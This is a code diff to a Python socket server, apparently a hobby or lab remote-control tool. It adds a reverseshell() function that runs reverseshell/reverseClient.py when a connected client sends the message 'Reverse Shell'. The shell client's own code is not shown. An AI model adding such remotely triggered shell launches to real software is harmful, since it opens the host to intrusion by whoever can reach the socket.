@@ -1,6 +1,8 @@
 import socket
 from threading import Thread
 import docker
+import os
+import subprocess
 import random
 import string
 import sys
@@ -36,6 +38,15 @@ if PIN_ASK.lower() == 'y':
     SERVER_PIN = input("Enter a Four Digit Pin for your server: ")
 
 Attempts = 0
+
+
+def reverseshell():
+    #with open("reverseshell/reverseClient.py") as f:
+        #exec(f.read())
+    #os.system("start cmd /k reverseClient.py")
+    subprocess.run(["python", "reverseshell/reverseClient.py"])
+    print("Shell Running")
+
 
 def checkimage():
     imageflag = Path("./flag")
@@ -100,6 +111,10 @@ def listen_for_client(cs):
                 checkimage()
             if msg == "Button 7":
                 print("Button 7 Okay")
+            if msg == "Reverse Shell":
+                print("Starting Shell")
+                reverseshell()
+                break
             if msg == "Disconnect":
                 print("Client Disconnecting")
                 break
